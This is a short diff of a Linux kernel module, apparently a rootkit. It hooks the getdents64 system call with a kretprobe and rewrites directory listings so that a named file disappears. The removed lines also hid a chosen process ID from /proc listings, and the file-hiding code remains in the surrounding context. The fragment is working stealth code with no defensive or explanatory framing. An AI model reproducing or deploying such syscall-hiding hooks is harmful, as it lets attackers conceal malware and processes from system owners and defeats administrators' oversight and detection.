@@ -81,19 +81,6 @@ static int getents64_handle_return(struct kretprobe_instance *ri, struct pt_regs
     unsigned long new_size_after_hide_file = hide_entry(args->buffer_ptr, buffer_count, hide_entry_by_name, (void*)hide_file_name);
     regs_set_return_value(regs, new_size_after_hide_file);
 
-
-    // // hide process by pid
-    struct file* file = files_lookup_fd_raw(current->files, args->fd);
-    struct super_block* sb= file->f_path.mnt->mnt_sb;
-
-    if(strcmp(sb->s_id, "proc") == 0){
-        unsigned long new_size_after_hide_proc = hide_entry(args->buffer_ptr, new_size_after_hide_file, hide_entry_by_name, (void*)pid_to_hide);
-        pr_info("did proc hidden=%d\n", (new_size_after_hide_file - new_size_after_hide_proc) > 0);
-        regs_set_return_value(regs, new_size_after_hide_proc);    
-    }
-    
-    
-
     //pr_info("getdents64 (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
     return 0;
 }
